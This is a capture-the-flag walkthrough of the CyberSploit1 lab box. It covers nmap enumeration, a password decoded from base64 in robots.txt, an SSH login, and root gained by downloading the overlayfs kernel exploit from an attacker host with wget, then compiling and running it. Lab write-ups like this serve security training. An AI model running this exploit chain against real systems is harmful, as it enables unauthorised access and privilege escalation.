# PG Play - CyberSploit1

#### Ip: 192.168.194.92
#### Name: CyberSploit1
#### Difficulty: Easy
#### Community Rating: Easy

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also use the `--min-rate 10000` flag. I'll also use the `-sV` and `-sC` flags to enumerate versions and use basic scripts:

```text
┌──(ryan㉿kali)-[~/PG/CyberSploit1]
└─$ sudo nmap -p-  --min-rate 10000 192.168.194.92 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 15:01 CDT
Nmap scan report for 192.168.194.92
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 011bc8fe18712860846a9f303511663d (DSA)
|   2048 d95314a37f9951403f49efef7f8b35de (RSA)
|_  256 ef435bd0c0ebee3e76615c6dce15fe7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
```

Heading to the site we find a GIF and several anchored links:

site.png

But in the page source we find an interesting comment:

username.png

Cool, looks like we've found a username, lets keep enumerating. 

Seeing if there is a robots.txt file, we find what appears to be base64:

robots.txt

Lets decode this in the terminal:

```text
┌──(ryan㉿kali)-[~/PG/CyberSploit1]
└─$ echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
cybersploit{youtube.com/c/cybersploit}
```

### Exploitation

Out of curiosity I tried this as a password in SSH with the discovered username, and it worked!

```text
┌──(ryan㉿kali)-[~/PG/CyberSploit1]
└─$ ssh itsskv@192.168.194.92                             
The authenticity of host '192.168.194.92 (192.168.194.92)' can't be established.
ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.194.92' (ECDSA) to the list of known hosts.
itsskv@192.168.194.92's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

itsskv@cybersploit-CTF:~$ hostname
cybersploit-CTF
```

We can now grab the local.txt flag:

user_flag.png

### Privilege Escalation

I'll go ahead and transfer LinPEAS over to the target to help find a privilege escalation vector:

transfer.png

Linpeas finds a few things of interest, but most interesting is this outdated version:

peas.png

Googling exploits we find this is vulnerable to overlayfs https://www.exploit-db.com/exploits/37292

Lets download this back to our machine and we can transfer it over an compile it on the target.

```text
itsskv@cybersploit-CTF:/tmp$ wget http://192.168.45.158/overlayfs.c
--2023-09-28 01:47:49--  http://192.168.45.158/overlayfs.c
Connecting to 192.168.45.158:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4981 (4.9K) [text/x-csrc]
Saving to: `overlayfs.c'

100%[===================================================================================>] 4,981       --.-K/s   in 0.007s  

2023-09-28 01:47:49 (704 KB/s) - `overlayfs.c' saved [4981/4981]

itsskv@cybersploit-CTF:/tmp$ gcc overlayfs.c -o ofs
itsskv@cybersploit-CTF:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

Nice, that worked! Lets grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

----------------------------------------------------------